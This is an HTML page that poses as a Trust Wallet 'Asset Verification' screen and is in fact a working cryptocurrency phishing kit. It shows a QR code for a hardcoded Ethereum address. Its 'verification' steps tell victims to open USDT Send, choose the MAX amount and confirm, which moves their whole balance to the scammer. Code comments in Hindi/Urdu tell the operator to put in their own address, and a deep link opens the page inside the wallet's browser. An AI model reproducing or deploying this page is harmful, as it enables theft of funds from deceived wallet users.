<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet | Asset Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
    <style>
        body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .card { background: #1e2329; padding: 25px; border-radius: 24px; text-align: center; width: 90%; max-width: 360px; border: 1px solid #2d3139; }
        .logo { width: 45px; margin-bottom: 8px; }
        h2 { font-size: 18px; color: #fff; margin-bottom: 5px; }
        p.desc { color: #929aa5; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
        
        #qrcode-container { background: white; padding: 12px; border-radius: 18px; display: inline-block; margin-bottom: 15px; }
        
        .address-box { background: #2d3139; border-radius: 12px; padding: 12px; margin-bottom: 20px; border: 1px dashed #474d57; }
        .address-text { font-size: 10px; color: #f0b90b; font-family: monospace; word-break: break-all; }

        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
        
        .step { text-align: left; font-size: 12px; color: #3172DE; margin-bottom: 15px; background: rgba(49, 114, 222, 0.1); padding: 10px; border-radius: 8px; }
    </style>
</head>
<body>

    <div class="card">
        <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
        <h2>Smart Node Sync</h2>
        
        <div id="qrcode-container">
            <div id="qrcode"></div>
        </div>

        <div class="step">
            <b>To Verify:</b><br>
            1. Scan QR in <b>USDT > Send</b> section.<br>
            2. Select <b>'MAX'</b> amount to sync all assets.<br>
            3. Click <b>'Next'</b> to complete verification.
        </div>

        <div class="address-box">
            <span id="addrDisplay" class="address-text">0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe</span>
        </div>

        <button id="nextBtn" class="btn" onclick="startVerification()">Connect via Browser</button>
    </div>

    <script>
        // YAHAN APNA ADDRESS DAALEIN
        const myAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 

        window.onload = function() {
            // Sirf Address ka QR banayenge taaki "Invalid" error na aaye
            new QRCode(document.getElementById("qrcode"), {
                text: myAddress,
                width: 180,
                height: 180
            });
        };

        function startVerification() {
            // Deep link jo wallet browser khol dega
            const currentUrl = window.location.href;
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(currentUrl);
        }
    </script>
</body>
</html>
